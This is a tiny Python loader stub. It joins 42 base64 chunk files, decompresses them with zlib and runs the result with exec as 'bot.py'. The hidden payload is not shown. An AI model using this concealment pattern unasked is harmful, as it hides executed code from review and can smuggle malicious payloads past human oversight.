# language: Python 3.11+
import zlib, base64
from pathlib import Path
_p = "".join(Path(__file__).with_name(f"t{i}.b64").read_text(encoding="utf-8") for i in range(42))
src = zlib.decompress(base64.b64decode(_p)).decode()
exec(compile(src, "bot.py", "exec"), globals())
